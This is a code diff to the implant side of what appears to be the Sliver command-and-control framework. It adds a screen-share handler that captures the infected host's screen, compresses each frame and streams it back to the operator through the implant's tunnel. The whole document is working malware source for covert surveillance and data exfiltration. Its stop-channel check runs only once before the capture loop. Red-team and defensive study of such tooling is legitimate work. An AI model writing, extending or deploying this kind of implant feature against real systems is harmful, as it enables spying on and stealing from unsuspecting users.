@@ -21,6 +21,8 @@ package handlers
 import (
 	"context"
 	"fmt"
+	"github.com/bishopfox/sliver/implant/sliver/encoders"
+	"github.com/bishopfox/sliver/implant/sliver/screen"
 	"io"
 	"net"
 	"sync"
@@ -43,8 +45,9 @@ var (
 		sliverpb.MsgPortfwdReq: portfwdReqHandler,
 		sliverpb.MsgSocksData:  socksReqHandler,
 
-		sliverpb.MsgTunnelData:  tunnelDataHandler,
-		sliverpb.MsgTunnelClose: tunnelCloseHandler,
+		sliverpb.MsgTunnelData:      tunnelDataHandler,
+		sliverpb.MsgTunnelClose:     tunnelCloseHandler,
+		sliverpb.MsgScreenShareData: screenShareHandler,
 	}
 
 	// TunnelID -> Sequence Number -> Data
@@ -487,4 +490,93 @@ func (c *socks) SetReadDeadline(t time.Time) error {
 // TODO impl
 func (c *socks) SetWriteDeadline(t time.Time) error {
 	return nil
+}
+
+var screenShare = sync.Map{}
+
+func screenShareHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	screenShareReq := &sliverpb.ScreenShareData{}
+	err := proto.Unmarshal(envelope.Data, screenShareReq)
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Printf("[screenShare] Failed to unmarshal protobuf %s", err)
+		//{{ end }}
+		return
+	}
+	var stopChan = make(chan bool)
+	//{{if .Config.Debug}}
+	log.Printf("[screenShareReq] %#v", screenShareReq)
+	//{{ end }}
+	if screenShareReq.Type == sliverpb.MsgTunnelClose {
+		//{{if .Config.Debug}}
+		log.Printf("[screenShare] RemoveTunnel %d", screenShareReq.TunnelID)
+		//{{ end }}
+		connection.RemoveTunnel(screenShareReq.TunnelID)
+
+		if v, ok := screenShare.Load(screenShareReq.TunnelID); ok {
+			stopChan = v.(chan bool)
+			stopChan <- true
+		}
+		return
+	}
+
+	// Add tunnel
+	tunnel := &transports.Tunnel{
+		ID: screenShareReq.TunnelID,
+	}
+	connection.AddTunnel(tunnel)
+
+	cleanup := func(reason error) {
+		// {{if .Config.Debug}}
+		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
+		// {{end}}
+
+		connection.RemoveTunnel(tunnel.ID)
+		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+			Closed:   true,
+			TunnelID: tunnel.ID,
+		})
+		connection.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgTunnelClose,
+			Data: tunnelClose,
+		}
+	}
+	screenShare.Store(tunnel.ID, make(chan bool))
+
+	if v, ok := screenShare.Load(tunnel.ID); ok {
+		stopChan = v.(chan bool)
+	}
+
+	go screen.ScreenShare(context.Background(), 0)
+	go func() {
+		select {
+		case <-stopChan:
+			return
+		default:
+			for data := range screen.ScreenShareData.Data {
+				tunnel := connection.Tunnel(tunnel.ID)
+				if tunnel != nil && connection.IsOpen {
+					// {{if .Config.Debug}}
+					log.Printf("ScreenShareData %d", len(data))
+					// {{end}}
+					uploadGzip := new(encoders.Gzip).Encode(data)
+					// {{if .Config.Debug}}
+					log.Printf("uploadGzip %d", len(uploadGzip))
+					// {{end}}
+					marshalData, _ := proto.Marshal(&sliverpb.ScreenShareData{
+						TunnelID: tunnel.ID,
+						Data:     uploadGzip,
+					})
+
+					connection.Send <- &sliverpb.Envelope{
+						Type: sliverpb.MsgScreenShareData,
+						Data: marshalData,
+					}
+				}
+
+			}
+		}
+		cleanup(err)
+	}()
+
 }
